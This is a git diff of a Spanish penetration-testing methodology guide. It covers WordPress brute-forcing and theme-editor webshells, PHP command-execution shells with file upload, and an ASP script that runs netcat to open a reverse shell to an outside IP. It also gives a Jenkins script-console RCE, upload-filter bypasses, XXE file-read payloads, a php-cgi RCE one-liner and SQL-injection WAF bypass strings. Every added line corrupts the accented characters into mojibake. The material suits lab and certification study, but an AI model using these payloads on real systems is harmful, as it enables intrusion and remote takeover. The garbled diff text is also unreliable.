 ```
 
-Donde veremos que la herrmamienta directamente nos proporcionará la Cookie de sesión para el usuario administrador.
+Donde veremos que la herrmamienta directamente nos proporcionarÃ¡ la Cookie de sesiÃ³n para el usuario administrador.
 
-Lo único que tenemos que hacer ahora, es desde **Burpsuite**, interceptar una autenticación con nuestro usuario para posteriormente modificar la Cookie a la proporcionada por **PadBuster**. Lo que conseguiremos con esto es acceder como el usuario **admin** al servicio web, burlando el panel de autenticación sin ser necesario conocer la contraseña de dicho usuario.
+Lo Ãºnico que tenemos que hacer ahora, es desde **Burpsuite**, interceptar una autenticaciÃ³n con nuestro usuario para posteriormente modificar la Cookie a la proporcionada por **PadBuster**. Lo que conseguiremos con esto es acceder como el usuario **admin** al servicio web, burlando el panel de autenticaciÃ³n sin ser necesario conocer la contraseÃ±a de dicho usuario.
 
 #### WordPress
 
-Sobre este gestor de contenidos, la idea es verificar en primer lugar si a través del recurso _README.html_ podemos visualizar la versión del CMS. De esta forma, posteriormente desde **Searchsploit** podemos buscar vulnerabilidades para dicha versión.
+Sobre este gestor de contenidos, la idea es verificar en primer lugar si a travÃ©s del recurso _README.html_ podemos visualizar la versiÃ³n del CMS. De esta forma, posteriormente desde **Searchsploit** podemos buscar vulnerabilidades para dicha versiÃ³n.
 
-En caso de no poder visualizar la versión, nos aprovechamos de la herramienta **wpscan** para a través de la siguiente sintaxis obtener el versionado del gestor:
+En caso de no poder visualizar la versiÃ³n, nos aprovechamos de la herramienta **wpscan** para a travÃ©s de la siguiente sintaxis obtener el versionado del gestor:
 
 ```bash
 $~ wpscan -u "http://192.168.1.x"
 ```
 
-En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo **/directorio-wordpress/**, deberemos especificarlo a través del parámetro **--wp-content-dir** para la correcta enumeración desde **wpscan**:
+En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo **/directorio-wordpress/**, deberemos especificarlo a travÃ©s del parÃ¡metro **--wp-content-dir** para la correcta enumeraciÃ³n desde **wpscan**:
 
 ```bash
 $~ wpscan -u "http://192.168.1.x" --wp-content-dir "directorio-wordpress"
@@ -2709,37 +2708,37 @@ En ocasiones, podremos enumerar los usuarios existentes sobre el gestor, emplean
 $~ wpscan -u "http://192.168.1.x" --enumerate u
 ```
 
-En caso de que el gestor de contenidos cuente con un plugin que bloquee la enumeración de usuarios, podemos hacer uso de la utilidad **stop_user_enumeration_bypass.rb** de _wpscan_ (/usr/share/wpscan/stop_user_enumeration_bypass.rb). La sintaxis sería la siguiente:
+En caso de que el gestor de contenidos cuente con un plugin que bloquee la enumeraciÃ³n de usuarios, podemos hacer uso de la utilidad **stop_user_enumeration_bypass.rb** de _wpscan_ (/usr/share/wpscan/stop_user_enumeration_bypass.rb). La sintaxis serÃ­a la siguiente:
 
 ```bash
 $~ ruby stop_user_enumeration_bypass.rb http://192.168.1.x
 ```
 
-Tras obtener usuarios válidos de autenticación, podemos probar a realizar a un ataque de fuerza bruta haciendo uso de la siguiente sintaxis:
+Tras obtener usuarios vÃ¡lidos de autenticaciÃ³n, podemos probar a realizar a un ataque de fuerza bruta haciendo uso de la siguiente sintaxis:
 
 ```bash
 $~ wpscan -u "http://192.168.1.x" --username usuario -w /usr/share/wordlists/rockyou.txt
 ```
 
-Una forma de bypassear posibles bloqueos es jugar con el parámetro **--random-agent**, de la siguiente forma:
+Una forma de bypassear posibles bloqueos es jugar con el parÃ¡metro **--random-agent**, de la siguiente forma:
 
 ```bash
 $~ wpscan -u "http://192.168.1.x" --username usuario -w /usr/share/wordlists/rockyou.txt --random-agent
 ```
 
-La herramienta **wpscan** es capaz de detectar los plugins instalados sobre el gestor, los cuales también pueden abrir un posible vector de ataque que permita la ejecución de comandos en remoto y variados. Sin embargo, por prevención siempre me gusta fuzzear los plugins haciendo uso del siguiente [recurso](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt) de SecList.
+La herramienta **wpscan** es capaz de detectar los plugins instalados sobre el gestor, los cuales tambiÃ©n pueden abrir un posible vector de ataque que permita la ejecuciÃ³n de comandos en remoto y variados. Sin embargo, por prevenciÃ³n siempre me gusta fuzzear los plugins haciendo uso del siguiente [recurso](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt) de SecList.
 
-En caso de no obtener o poder enumerar usuarios válidos de autenticación, estos gestores de contenido suelen exponer el usuario propietario de los artículos o entradas que figuren expuestos sobre la página principal. De esta forma, podemos llegar a extraer usuarios válidos de autenticación simplemente visualizando quién es el autor de las entradas publicadas.
+En caso de no obtener o poder enumerar usuarios vÃ¡lidos de autenticaciÃ³n, estos gestores de contenido suelen exponer el usuario propietario de los artÃ­culos o entradas que figuren expuestos sobre la pÃ¡gina principal. De esta forma, podemos llegar a extraer usuarios vÃ¡lidos de autenticaciÃ³n simplemente visualizando quiÃ©n es el autor de las entradas publicadas.
 
-Teniendo un usuario válido de autenticación, a la hora de aplicar la fuerza bruta, antes de lanzar diccionarios tradicionales como el **rockyou.txt**, suelo hacer uso de la herramienta **cewl** para generar mi propio diccionario personalizado en base a la web con la que estoy tratando. Esto se consigue con la siguiente sintaxis:
+Teniendo un usuario vÃ¡lido de autenticaciÃ³n, a la hora de aplicar la fuerza bruta, antes de lanzar diccionarios tradicionales como el **rockyou.txt**, suelo hacer uso de la herramienta **cewl** para generar mi propio diccionario personalizado en base a la web con la que estoy tratando. Esto se consigue con la siguiente sintaxis:
 
 ```bash
 cewl -w diccionario http://192.168.1.x
 ```
 
-Así mismo, una vez se logra acceder al gestor de contenidos, la intrusión al sistema es la parte más sencilla. Simplemente en la sección de Apariencia, en la pestaña Editor nos vamos al script **404.php** configurado para llevar a cabo una modificación, subiendo nuestro propio código PHP malicioso que permita entablarnos una conexión reversa contra el sistema.
+AsÃ­ mismo, una vez se logra acceder al gestor de contenidos, la intrusiÃ³n al sistema es la parte mÃ¡s sencilla. Simplemente en la secciÃ³n de Apariencia, en la pestaÃ±a Editor nos vamos al script **404.php** configurado para llevar a cabo una modificaciÃ³n, subiendo nuestro propio cÃ³digo PHP malicioso que permita entablarnos una conexiÃ³n reversa contra el sistema.
 
-Para apuntar a dicho script tenemos 3 vías:
+Para apuntar a dicho script tenemos 3 vÃ­as:
 
 * http://192.168.1.x/?p=404.php
 * http://192.168.1.x/recursoinexistente (Para causar un error que haga que se cargue el script 404.php)
@@ -2747,7 +2746,7 @@ Para apuntar a dicho script tenemos 3 vías:
 
 #### PHP Reverse Shell Manual Multifuncional
 
-La más típica de las ejecuciones vía PHP que nos podemos configurar es la siguiente:
+La mÃ¡s tÃ­pica de las ejecuciones vÃ­a PHP que nos podemos configurar es la siguiente:
 
 ```php
 <?php
@@ -2755,7 +2754,7 @@ La más típica de las ejecuciones vía PHP que nos podemos configurar es la sig
 ?>
 ```
 
-Pero esto dice mucho de nosotros, vamos a mejorar un poco las cosas. En vez de usar **system**, podemos usar **shell_exec**, más específico para la ejecución de comandos vía shell con retorno del output en formato string.
+Pero esto dice mucho de nosotros, vamos a mejorar un poco las cosas. En vez de usar **system**, podemos usar **shell_exec**, mÃ¡s especÃ­fico para la ejecuciÃ³n de comandos vÃ­a shell con retorno del output en formato string.
 
 Esto se resume en la siguiente estructura:
 
@@ -2773,11 +2772,11 @@ En caso de querer ejecutar comandos personalizados desde la URL, podemos definir
 ?>
 ```
 
-De manera que podríamos elaborar desde la URL la siguiente petición:
+De manera que podrÃ­amos elaborar desde la URL la siguiente peticiÃ³n:
 
 `http://192.168.1.X/fichero.php?cmd=whoami`
 
-A la hora de ejecutar ciertos comandos como '_ps -faux_', o un simple '_cat /etc/passwd_', se puede ver como el Output mostrado vía web en este caso tiene un aspecto poco agradable de leer. Esto lo podemos arreglar añadiendo unas etiquetas de preformateado en nuestro script:
+A la hora de ejecutar ciertos comandos como '_ps -faux_', o un simple '_cat /etc/passwd_', se puede ver como el Output mostrado vÃ­a web en este caso tiene un aspecto poco agradable de leer. Esto lo podemos arreglar aÃ±adiendo unas etiquetas de preformateado en nuestro script:
 
 ```php
 <?php
@@ -2785,7 +2784,7 @@ A la hora de ejecutar ciertos comandos como '_ps -faux_', o un simple '_cat /etc
 ?>
 ```
 
-En caso de querer hacerlo **multifuncional**, podemos gestionar la variable proporcionada desde el usuario que hace la petición, donde para el caso presentado a continuación, además de ejecutar comandos a través de la variable '_fexec_', creamos una nueva variable '_fupload_' para la transferencia de archivos desde nuestra máquina local a la máquina remota en el directorio de trabajo:
+En caso de querer hacerlo **multifuncional**, podemos gestionar la variable proporcionada desde el usuario que hace la peticiÃ³n, donde para el caso presentado a continuaciÃ³n, ademÃ¡s de ejecutar comandos a travÃ©s de la variable '_fexec_', creamos una nueva variable '_fupload_' para la transferencia de archivos desde nuestra mÃ¡quina local a la mÃ¡quina remota en el directorio de trabajo:
 
 ```php
 <?php
@@ -2799,7 +2798,7 @@ En caso de querer hacerlo **multifuncional**, podemos gestionar la variable prop
 ?>
 ```
 
-De esta forma, el usuario que hace las consultas podría efectuar cualquiera de las siguientes 3 operaciones:
+De esta forma, el usuario que hace las consultas podrÃ­a efectuar cualquiera de las siguientes 3 operaciones:
 
 * http://192.168.1.X/fichero.php?fexec=whoami
 * http://192.168.1.X/fichero.php?fupload=script.php 
@@ -2809,7 +2808,7 @@ Para depositar archivos sobre el sistema aprovechando la variable '_fupload_', n
 
 #### ASP ASPX Reverse Shell
 
-Habiendo citado ya una forma de entablar una conexión TCP reversa a través de un fichero .asp/.aspx generado desde Metasploit, otra vía en caso de que la primera no funcione, es crear un archivo con dicho contenido:
+Habiendo citado ya una forma de entablar una conexiÃ³n TCP reversa a travÃ©s de un fichero .asp/.aspx generado desde Metasploit, otra vÃ­a en caso de que la primera no funcione, es crear un archivo con dicho contenido:
 
 ```bash
 <%
@@ -2820,26 +2819,26 @@ Call oS.Run("C:\Inetpub\nc.exe -e cmd 10.11.0.173 1122",0,True)
 %>
 ```
 
-Habiendo previamente subido el binario **nc.exe**, con esto conseguiremos que de ser interpretado vía web el script, se nos entable una reverse shell por el puerto 1122 vía Netcat gracias a la ejecución del binario previamente alojado.
+Habiendo previamente subido el binario **nc.exe**, con esto conseguiremos que de ser interpretado vÃ­a web el script, se nos entable una reverse shell por el puerto 1122 vÃ­a Netcat gracias a la ejecuciÃ³n del binario previamente alojado.
 
 #### x-jenkins
 
-En caso de que el servicio web corra un **Jenkins**, de manera inmediata se comprobará si existe el recurso **/script/** sobre el servicio. En caso de existir, el servicio es vulnerable a ejecución remota de comandos gracias al script de consultas interactivas que podemos crear desde ahí.
+En caso de que el servicio web corra un **Jenkins**, de manera inmediata se comprobarÃ¡ si existe el recurso **/script/** sobre el servicio. En caso de existir, el servicio es vulnerable a ejecuciÃ³n remota de comandos gracias al script de consultas interactivas que podemos crear desde ahÃ­.
 
-Para ello, deberemos definir las siguientes líneas de consulta:
+Para ello, deberemos definir las siguientes lÃ­neas de consulta:
 
 ```bash
 cmd = "whoami"
 cmd.execute().text
 ```
 
-Tras enviar la consulta, veremos el Output de la ejecución a nivel de sistema del comando proporcionado.
+Tras enviar la consulta, veremos el Output de la ejecuciÃ³n a nivel de sistema del comando proporcionado.
 
 #### Bypass File Upload Filtering
 
-Una de las técnicas típicas además del **Null Byte Injection** y las de **Content-Type**, es la de doble extensión. Esto es simplemente renombrar nuestro script php a _shell.php.jpg_. 
+Una de las tÃ©cnicas tÃ­picas ademÃ¡s del **Null Byte Injection** y las de **Content-Type**, es la de doble extensiÃ³n. Esto es simplemente renombrar nuestro script php a _shell.php.jpg_. 
 
-Listo a continuación otros formatos aceptados en función del lenguaje que se utilice:
+Listo a continuaciÃ³n otros formatos aceptados en funciÃ³n del lenguaje que se utilice:
 
 **php** phtml, .php, .php3, .php4, .php5, and .inc
 **asp** asp, .aspx
@@ -2856,7 +2855,7 @@ system($_GET['cmd']);
 ?>
 ```
 
-Otra vía alternativa es a través de imágenes, haciendo uso de **exiftool** para insertar metadatos. Para ello, sobre una imagen válida, aplicamos el siguiente comando:
+Otra vÃ­a alternativa es a travÃ©s de imÃ¡genes, haciendo uso de **exiftool** para insertar metadatos. Para ello, sobre una imagen vÃ¡lida, aplicamos el siguiente comando:
 
 ```bash
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' imagen.jpg
@@ -2864,28 +2863,28 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' imagen.jpg
 
 Posteriormente, es necesario renombar el archivo **imagen.jpg** a **imagen.php.jpg**. Una vez hecho, tras subir la imagen, podremos apuntar a ella jugando con la variable **cmd** posteriormente para ejecutar comandos en remoto sobre el sistema desde la URL.
 
-Otra técnica bastante chula, consiste en subir un archivo **.htaccess**. En caso de existir en el directorio de subida, la idea es poder sobreescribir su contenido. En caso de no existir, es simplemente rezar y esperar que no exista otro en un directorio padre.
+Otra tÃ©cnica bastante chula, consiste en subir un archivo **.htaccess**. En caso de existir en el directorio de subida, la idea es poder sobreescribir su contenido. En caso de no existir, es simplemente rezar y esperar que no exista otro en un directorio padre.
 
-Nuestro archivo **.htaccess**, tendría el siguiente contenido:
+Nuestro archivo **.htaccess**, tendrÃ­a el siguiente contenido:
 
 ```bash
 Add-Type Application/x-httpd-php .miextension
 ```
 
-De subirlo y alojarlo en el servidor, posteriormente si subimos un archivo de extensión **.miextension**, será interpretado como un archivo PHP.
+De subirlo y alojarlo en el servidor, posteriormente si subimos un archivo de extensiÃ³n **.miextension**, serÃ¡ interpretado como un archivo PHP.
 
 #### XML External Entity Injection
 
-Para practicar podemos jugar con las máquinas **Aragog** y **DevOops** de **HackTheBox**. Antes que nada quiero citar que es necesario conocer la estructura XML que hay por detrás a la hora de interpretar el content, me explico. Supongamos que tras subir un archivo XML, la web nos muestra el siguiente Output:
+Para practicar podemos jugar con las mÃ¡quinas **Aragog** y **DevOops** de **HackTheBox**. Antes que nada quiero citar que es necesario conocer la estructura XML que hay por detrÃ¡s a la hora de interpretar el content, me explico. Supongamos que tras subir un archivo XML, la web nos muestra el siguiente Output:
 
 ```bash
 User: s4vitar
 Password: myPassword
 ```
 
-Esto ha sido así dado que previamente de alguna forma se nos ha avisado de que las sub-etiquetas a definir en nuestro archivo XML son **User** y **Password**, así como una etiqueta principal **creds** que englobe a estas. Esto nos permite llevar a cabo un ataque como el que describiré a continuación. 
+Esto ha sido asÃ­ dado que previamente de alguna forma se nos ha avisado de que las sub-etiquetas a definir en nuestro archivo XML son **User** y **Password**, asÃ­ como una etiqueta principal **creds** que englobe a estas. Esto nos permite llevar a cabo un ataque como el que describirÃ© a continuaciÃ³n. 
 
-En un principio, estaríamos enviando el siguiente archivo XML:
+En un principio, estarÃ­amos enviando el siguiente archivo XML:
 
 ```bash
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -2895,7 +2894,7 @@ En un principio, estaríamos enviando el siguiente archivo XML:
     </creds>
 ```
 
-Conociendo por tanto la estructura, podríamos decidir enviar un contenido como el siguiente:
+Conociendo por tanto la estructura, podrÃ­amos decidir enviar un contenido como el siguiente:
 
 ```bash
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -2907,14 +2906,14 @@ Conociendo por tanto la estructura, podríamos decidir enviar un contenido como 
     </creds>
 ```
 
-A la hora de listar el Output desde la web, nos encontraríamos con el siguiente resultado:
+A la hora de listar el Output desde la web, nos encontrarÃ­amos con el siguiente resultado:
 
 ```bash
 User: www-data
 Password: myPassword
 ```
 
-Esto ha sido así dado que estamos jugando con el _wrapper_ **expect**. Hay casos en los que puede que no se logre ejecutar comandos en el sistema, en tal caso podríamos probar a leer archivos de la siguiente forma:
+Esto ha sido asÃ­ dado que estamos jugando con el _wrapper_ **expect**. Hay casos en los que puede que no se logre ejecutar comandos en el sistema, en tal caso podrÃ­amos probar a leer archivos de la siguiente forma:
 
 ```bash
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -2926,9 +2925,9 @@ Esto ha sido así dado que estamos jugando con el _wrapper_ **expect**. Hay caso
     </creds>
 ```
 
-Donde tal y como se podrá predecir, en el campo **User** se listará el contenido del fichero **/etc/passwd**. Una idea aquí es visualizar si para algunas de los usuarios existentes en base a la visualización del recurso anteriormente visto, bajo el directorio **.ssh** podemos encontrarnos con una clave privada de acceso por SSH para usarla como fichero de identificación, de esta forma... lograríamos acceder al sistema sin proporcionar contraseña alguna.
+Donde tal y como se podrÃ¡ predecir, en el campo **User** se listarÃ¡ el contenido del fichero **/etc/passwd**. Una idea aquÃ­ es visualizar si para algunas de los usuarios existentes en base a la visualizaciÃ³n del recurso anteriormente visto, bajo el directorio **.ssh** podemos encontrarnos con una clave privada de acceso por SSH para usarla como fichero de identificaciÃ³n, de esta forma... lograrÃ­amos acceder al sistema sin proporcionar contraseÃ±a alguna.
 
-Otro ejemplo práctico así como modo de hacer el mismo procedimiento es el siguiente. Supongamos un servicio Apache, esta vez no tenemos la posibilidad de subir archivos, sin embargo contamos por detrás con la siguiente estructura:
+Otro ejemplo prÃ¡ctico asÃ­ como modo de hacer el mismo procedimiento es el siguiente. Supongamos un servicio Apache, esta vez no tenemos la posibilidad de subir archivos, sin embargo contamos por detrÃ¡s con la siguiente estructura:
 
 ```bash
 <?php 
@@ -2952,7 +2951,7 @@ Como es de obviar, se nos pide una estructura XML como la siguiente:
 </creds>
 ```
 
-En este caso varía un poco la petición, pero podemos hacerla desde terminal:
+En este caso varÃ­a un poco la peticiÃ³n, pero podemos hacerla desde terminal:
 
 ```bash
 $~ curl -d @xml.txt http://localhost/xml_injectable.php 
@@ -2964,7 +2963,7 @@ El concepto al fin y al cabo es el mismo, el servidor responde lo siguiente:
 You have logged in as user Ed
 ```
 
-Y a raíz de esto, podemos elaborar una estructura XML maliciosa como la siguiente:
+Y a raÃ­z de esto, podemos elaborar una estructura XML maliciosa como la siguiente:
 
 ```bash
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -2976,7 +2975,7 @@ Y a raíz de esto, podemos elaborar una estructura XML maliciosa como la siguien
 </creds>
 ```
 
-¿Qué conseguimos con esto?, obtener lo siguiente:
+Â¿QuÃ© conseguimos con esto?, obtener lo siguiente:
 
 ```bash
 $~ curl -d @xml.txt http://localhost/xml_injectable.php 
@@ -2998,21 +2997,21 @@ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 
 #### PHP CGI Exploitation
 
-A continuación, se detalla una vulnerabilidad presente en algunos **php-cgi** desactualizados, los cuales nos permiten entre otras cosas lograr la ejecución remota de comandos.
+A continuaciÃ³n, se detalla una vulnerabilidad presente en algunos **php-cgi** desactualizados, los cuales nos permiten entre otras cosas lograr la ejecuciÃ³n remota de comandos.
 
-La pregunta a hacerse es, ¿cómo comprobamos si en caso de que exista, posee una versión vulnerable?. Dado que uno de los parámetros con los que cuenta el binario es el **-s**, el cual nos permite ver el Source de aquello que le pasemos, una de las trazas que suelo hacer para corroborar si es o no es vulnerable es hacer una consulta sobre el recurso **/?-s**.
+La pregunta a hacerse es, Â¿cÃ³mo comprobamos si en caso de que exista, posee una versiÃ³n vulnerable?. Dado que uno de los parÃ¡metros con los que cuenta el binario es el **-s**, el cual nos permite ver el Source de aquello que le pasemos, una de las trazas que suelo hacer para corroborar si es o no es vulnerable es hacer una consulta sobre el recurso **/?-s**.
 
-Si lo que vemos es el código fuente en vez del contenido de la página en formato legible, esto quiere decir, en pocas palabras, que es probable que podamos hacer **RCE** (Remote Code Execution). Recapitulando, hemos sido capaces de ver el Source de la propia web a través del parámetro pasado, pero no sirve de mucho si lo que pretendemos hacer es dar un enfoque intrusivo a la máquina que sustenta este servidor web.
+Si lo que vemos es el cÃ³digo fuente en vez del contenido de la pÃ¡gina en formato legible, esto quiere decir, en pocas palabras, que es probable que podamos hacer **RCE** (Remote Code Execution). Recapitulando, hemos sido capaces de ver el Source de la propia web a travÃ©s del parÃ¡metro pasado, pero no sirve de mucho si lo que pretendemos hacer es dar un enfoque intrusivo a la mÃ¡quina que sustenta este servidor web.
 
-Sin embargo, existe otro parámetro interesante del php-cgi del cual nos podemos aprovechar, el parámetro **-d**. Este parámetro nos permite definir las entradas **INI** de la configuración de archivos. Algo a tener en cuenta, en caso de pretender lograr ejecución remota de código, es tratar de enviar código PHP al servidor y que sea capaz de interpretarlo. 
+Sin embargo, existe otro parÃ¡metro interesante del php-cgi del cual nos podemos aprovechar, el parÃ¡metro **-d**. Este parÃ¡metro nos permite definir las entradas **INI** de la configuraciÃ³n de archivos. Algo a tener en cuenta, en caso de pretender lograr ejecuciÃ³n remota de cÃ³digo, es tratar de enviar cÃ³digo PHP al servidor y que sea capaz de interpretarlo. 
 
-Para ello, lo que hacemos es utilizar el _wrapper_ **php://input**, con el fin de incrustar el código definido en el cuerpo de la solicitud.
+Para ello, lo que hacemos es utilizar el _wrapper_ **php://input**, con el fin de incrustar el cÃ³digo definido en el cuerpo de la solicitud.
 
-Necesitamos 2 cosas para ello, por un lado, necesitamos que se lea el código php de nuestra solicitud. Lo que buscamos es una opción PHP que diga al propio PHP que lea de un archivo y lo apunte a **php://input**. Afortunadamente, PHP cuenta con la opción **auto_prepend_file** desde la versión 4.2.3. Lo bueno de esta opción, es que el contenido del archivo se incluye antes que cualquier otro archivo, o en otras palabras, se incluye antes de ejecutar cualquier otro código, por lo que garantizamos que ningún otro código afecte a nuestra explotación.
+Necesitamos 2 cosas para ello, por un lado, necesitamos que se lea el cÃ³digo php de nuestra solicitud. Lo que buscamos es una opciÃ³n PHP que diga al propio PHP que lea de un archivo y lo apunte a **php://input**. Afortunadamente, PHP cuenta con la opciÃ³n **auto_prepend_file** desde la versiÃ³n 4.2.3. Lo bueno de esta opciÃ³n, es que el contenido del archivo se incluye antes que cualquier otro archivo, o en otras palabras, se incluye antes de ejecutar cualquier otro cÃ³digo, por lo que garantizamos que ningÃºn otro cÃ³digo afecte a nuestra explotaciÃ³n.
 
-Por otro lado, si queremos usar **php://input**, debemos permitir que la url lo incluya, pero esto no supone ningún problema, dado que podemos redefinir las entradas INI. Esto puede activarse fácilmente usando **-d allow_url_include=1**.
+Por otro lado, si queremos usar **php://input**, debemos permitir que la url lo incluya, pero esto no supone ningÃºn problema, dado que podemos redefinir las entradas INI. Esto puede activarse fÃ¡cilmente usando **-d allow_url_include=1**.
 
-Suponiendo que quisiéramos ejecutar en remoto el comando _whoami_, lo que hacemos es montarnos un simple script PHP de antemano el cual enviamos posteriormente vía POST a la web con todo lo que hemos comentado. De la siguiente forma:
+Suponiendo que quisiÃ©ramos ejecutar en remoto el comando _whoami_, lo que hacemos es montarnos un simple script PHP de antemano el cual enviamos posteriormente vÃ­a POST a la web con todo lo que hemos comentado. De la siguiente forma:
 
 ```bash
 $~ echo "<?php system('whoami');die(); ?>" | POST "http://192.168.1.X/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
@@ -3020,7 +3019,7 @@ $~ echo "<?php system('whoami');die(); ?>" | POST "http://192.168.1.X/?-d+allow_
 www-data
 ```
 
-Para entablar una reverse shell, ya simplemente dependerá de la metodología que una quiera emplear.
+Para entablar una reverse shell, ya simplemente dependerÃ¡ de la metodologÃ­a que una quiera emplear.
 
 #### Waf Bypassing
 
@@ -3028,63 +3027,63 @@ Para entablar una reverse shell, ya simplemente dependerá de la metodología qu
 
 **1. Null Bytes**
 
-Para elaborar una inyección **Null Byte**:
+Para elaborar una inyecciÃ³n **Null Byte**:
 
 ```bash
-http://example.com/news.php?id=1+%00’union+select+1,2,3′–
+http://example.com/news.php?id=1+%00â€™union+select+1,2,3â€²â€“
 ```
 
-**2. Consultas a través de SQL Comments**
+**2. Consultas a travÃ©s de SQL Comments**
 
 ```bash
-http://example.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3–
+http://example.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3â€“
 ```
 
 **3. URL Encoding**
 
 ```bash
-http://example.com/news.php?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4—
+http://example.com/news.php?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4â€”
 ```
 
 **4. Encode to Hex Forbidden**
 
 ```bash
-http://example.com/news.php?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 –+-
+http://example.com/news.php?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 â€“+-
 
-http://example.com/news.php?id=-1%2F%2Funion%2F%2Fselect%2F**%2F1,2,3,4,5 –+-
+http://example.com/news.php?id=-1%2F%2Funion%2F%2Fselect%2F**%2F1,2,3,4,5 â€“+-
 ```
 
 **5. Case Changing**
 
 ```bash
-http://example.com/news.php?id=-1+UnIoN//SeLecT//1,2,3–+-
+http://example.com/news.php?id=-1+UnIoN//SeLecT//1,2,3â€“+-
 ```
 
 **6. Replaced Keywords**
 
 ```bash
-http://example.com/news.php?id=-1+UNunionION+SEselectLECT+1,2,3–+
+http://example.com/news.php?id=-1+UNunionION+SEselectLECT+1,2,3â€“+
 ```
 
 **7. WAF Bypassing - using characters**
 
 ```bash
-http://example.com/news.php?id=-1+uni*on+sel*ect+1,2,3,4–+-
+http://example.com/news.php?id=-1+uni*on+sel*ect+1,2,3,4â€“+-
 ```
 
 **8. CRLF WAF Bypass Technique**
 
 ```bash
-http://example.com/news.php?id=-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5 —
+http://example.com/news.php?id=-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5 â€”
 ```
 
 **9. HTTP Parameter Pollution (PHP)**
 
 ```bash
-http://example.com/news.php?id=1;select+1&id=2,3+from+users+where+id=1–
+http://example.com/news.php?id=1;select+1&id=2,3+from+users+where+id=1â€“
 
 
-http://example.com/news.php?id=-1/* &id= */union/* &id= */select/* &id= */1,2 —
+http://example.com/news.php?id=-1/* &id= */union/* &id= */select/* &id= */1,2 â€”
 ```
 
 
@@ -3092,7 +3091,7 @@ http://example.com/news.php?id=-1/* &id= */union/* &id= */select/* &id= */1,2 �
 
 #### Tratamiento de la TTY
 
-Una vez accedemos a un equipo Linux con una reverse shell de Netcat, veremos que andamos a ciegas, lo que hace que incluso no podamos utilizar servicios que corran en interactivo (Python, mysql, etc.). Para arreglar este problema, simplemente seguimos los pasos que se describen a continuación.
+Una vez accedemos a un equipo Linux con una reverse shell de Netcat, veremos que andamos a ciegas, lo que hace que incluso no podamos utilizar servicios que corran en interactivo (Python, mysql, etc.). Para arreglar este problema, simplemente seguimos los pasos que se describen a continuaciÃ³n.
 
 * Cargamos una pseudoconsola sobre el sistema
 
@@ -3102,7 +3101,7 @@ Tenemos 2 formas de hacer esto, la primera es la siguiente:
 script /dev/null -c bash
 ```
 
-Otra de ellas es a través de python, para ello se recomienda aplicar un `whereis python` a nivel de sistema para comprobar las versiones que se encuentran presentes en el sistema, así tendremos que aplicar el siguiente comando seguido de su versión:
+Otra de ellas es a travÃ©s de python, para ello se recomienda aplicar un `whereis python` a nivel de sistema para comprobar las versiones que se encuentran presentes en el sistema, asÃ­ tendremos que aplicar el siguiente comando seguido de su versiÃ³n:
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -3110,7 +3109,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 
 * Configuramos las variables de entorno correctamente
 
-A continuación presionamos la tecla **Ctrl+Z**, esto lo que hará será dejar en segundo plano nuestra sesión (no hay que asustarse). Una vez hecho, aplicamos los siguientes comandos:
+A continuaciÃ³n presionamos la tecla **Ctrl+Z**, esto lo que harÃ¡ serÃ¡ dejar en segundo plano nuestra sesiÃ³n (no hay que asustarse). Una vez hecho, aplicamos los siguientes comandos:
 
 ```bash
 stty raw -echo
@@ -3119,22 +3118,22 @@ reset
 xterm
 ```
 
-Tras introducir el primero, es normal que al escribir **fg** no veamos lo que se está escribiendo, sin embargo se están introduciendo los caracteres. Este comando lo que hará será retornanos a la sesión que teníamos vía **Netcat**. Con el comando **reset** reconfiguraremos nuestra sesión, preguntándonos en la mayoría de los casos a continuación con qué tipo de terminal queremos tratar.
+Tras introducir el primero, es normal que al escribir **fg** no veamos lo que se estÃ¡ escribiendo, sin embargo se estÃ¡n introduciendo los caracteres. Este comando lo que harÃ¡ serÃ¡ retornanos a la sesiÃ³n que tenÃ­amos vÃ­a **Netcat**. Con el comando **reset** reconfiguraremos nuestra sesiÃ³n, preguntÃ¡ndonos en la mayorÃ­a de los casos a continuaciÃ³n con quÃ© tipo de terminal queremos tratar.
 
-Puede ser que no nos pregunte por el tipo de terminal, en caso de que sí lo haga, introducimos `xterm`, en caso de que no e incluso aunque lo pida, posteriormente aplicamos los siguientes comandos:
+Puede ser que no nos pregunte por el tipo de terminal, en caso de que sÃ­ lo haga, introducimos `xterm`, en caso de que no e incluso aunque lo pida, posteriormente aplicamos los siguientes comandos:
 
 ```bash
 export TERM=xterm
 export SHELL=bash
 ```
 
-Una vez hecho, lo único que queda (paso opcional), es configurar correctamente el redimensionamiento de la terminal, pues en caso de abrir algún editor como nano, veremos que las proporciones no cuadran. Para ello, lo más recomendable es poner a tamaño completo la terminal.
+Una vez hecho, lo Ãºnico que queda (paso opcional), es configurar correctamente el redimensionamiento de la terminal, pues en caso de abrir algÃºn editor como nano, veremos que las proporciones no cuadran. Para ello, lo mÃ¡s recomendable es poner a tamaÃ±o completo la terminal.
 
 Abrimos otra terminal en nuestro sistema con el mismo redimensionamiento, y aplicamos el siguiente comando:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop]
-└──╼ #stty -a
+â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
+â””â”€â”€â•¼ #stty -a
 speed 38400 baud; rows 44; columns 190; line = 0;
